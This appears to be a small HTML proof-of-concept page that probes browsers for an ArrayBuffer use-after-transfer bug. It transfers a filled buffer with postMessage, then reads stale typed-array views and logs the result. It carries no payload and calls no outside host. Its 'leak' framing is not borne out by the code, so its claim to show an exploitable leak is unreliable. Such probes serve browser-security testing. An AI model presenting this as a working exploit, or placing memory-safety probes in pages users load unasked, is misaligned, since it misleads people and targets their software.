<!DOCTYPE html>
<html>
<head><title>ArrayBuffer Leak PoC</title></head>
<body>
<pre id="log"></pre>
<script>
const log = txt => document.getElementById('log').textContent += txt + "\n";

function trigger() {
  let ab = new ArrayBuffer(0x100);
  let u32 = new Uint32Array(ab);
  let f64 = new Float64Array(ab);

  // Fill with predictable data
  for (let i = 0; i < u32.length; i++) u32[i] = i + 1;

  // Simulate detachment or reallocation bug
  try {
    postMessage(ab, '*', [ab]);
  } catch (e) {
    log("Transfer threw, that's expected on non-worker.");
  }

  // Try accessing after transfer (should be detached or corrupted)
  try {
    log("u32[0] = " + u32[0]);
    log("f64[0] = " + f64[0]);
  } catch (e) {
    log("Access after transfer failed: " + e);
  }
}

trigger();
</script>
</body>
</html>
